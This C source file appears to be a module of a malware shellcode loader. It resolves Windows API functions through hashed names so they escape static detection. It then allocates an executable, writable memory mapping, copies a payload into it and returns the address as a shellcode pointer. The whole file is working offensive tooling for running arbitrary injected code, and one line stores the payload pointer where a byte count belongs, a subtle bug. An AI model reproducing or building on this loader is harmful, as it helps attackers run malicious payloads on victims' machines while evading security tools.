#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apidefs.h"
#include "../../../includes/apis/apis.h"


BOOL memory_load_apis() {
	apis->CreateFileMappingA = (pCreateFileMappingA)GetProc(apis->modules.kernel32, HASHED_CREATESECTION);
	apis->MapViewOfFile = (pMapViewOfFile)GetProc(apis->modules.kernel32, HASHED_MAPVIEWOFFILE);
	apis->CloseHandle = (pCloseHandle)GetProc(apis->modules.kernel32, HASHED_CLOSEHANDLE);
	return TRUE;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
	MemoryInfo memInfo = { 0 };

	HANDLE hFile = apis->CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	LPVOID Address = apis->MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, PayloadSize);
	if (Address == NULL) {
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	memcpy(Address, PayloadAddress, PayloadSize);

	apis->CloseHandle(hFile);

	memInfo.ShellCodeAddress = Address;
	memInfo.ok = TRUE;
	memInfo.BytesWrote = PayloadAddress;
	return memInfo;
}